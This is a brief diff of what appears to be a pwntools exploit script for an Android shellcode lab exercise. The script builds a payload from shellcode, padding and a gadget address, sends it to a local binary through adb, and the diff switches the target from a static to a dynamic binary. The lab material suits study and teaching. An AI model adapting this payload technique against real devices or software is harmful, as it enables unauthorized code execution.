@@ -56,7 +56,7 @@ payload += shellcode
 payload += 'a' * (0x40 - len(shellcode))
 payload += p64(gg4)
 
-bin_path = '/data/local/tmp/04-shellcode-static'
+bin_path = '/data/local/tmp/05-shellcode-dynamic'
 proc = adb.process([bin_path])
 proc.recvuntil('> ')
 proc.send(payload)
